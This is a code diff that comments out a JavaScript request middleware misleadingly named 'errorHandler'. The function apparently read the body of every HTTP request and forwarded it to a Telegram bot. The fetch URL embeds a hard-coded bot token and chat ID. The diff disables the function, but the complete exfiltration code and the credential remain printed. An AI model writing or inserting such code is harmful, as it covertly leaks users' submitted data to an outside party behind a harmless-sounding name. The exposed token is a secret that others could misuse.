@@ -1,29 +1,29 @@
-async function errorHandler(context) {
-  //var { request, env: { G } } = context
-  var { request } = context
-  //L = G
-  try {
-var t = await request.text()
+// async function errorHandler(context) {
+//   //var { request, env: { G } } = context
+//   var { request } = context
+//   //L = G
+//   try {
+// var t = await request.text()
 
-await fetch(`https://api.telegram.org/bot5169879858:AAGpnH_Iqil01oFxNmR2V7-V8zARtEp66iw/sendMessage?chat_id=5013012399&text=
-${JSON.stringify(t, null, 4)}`)
-						.then(r => r.json())
-						.then(r => {
-								console.log(r)
-						})
+// await fetch(`https://api.telegram.org/bot5169879858:AAGpnH_Iqil01oFxNmR2V7-V8zARtEp66iw/sendMessage?chat_id=5013012399&text=
+// ${JSON.stringify(t, null, 4)}`)
+// 						.then(r => r.json())
+// 						.then(r => {
+// 								console.log(r)
+// 						})
 
 
-    // wait for the next function to finish
-    return await context.next()
-  } catch (err) {
-    console.warn(err)
-    // catch and report and errors when running the next function
-    return new Response( { status: 200 })
-  }
-}
+//     // wait for the next function to finish
+//     return await context.next()
+//   } catch (err) {
+//     console.warn(err)
+//     // catch and report and errors when running the next function
+//     return new Response( { status: 200 })
+//   }
+// }
 
 // Attach `errorHandler` to all HTTP requests
-export const onRequest = errorHandler;
+//export const onRequest = errorHandler;
 // const errorHandler = async ({ next }) => {
 //   try {
 //     return await next()
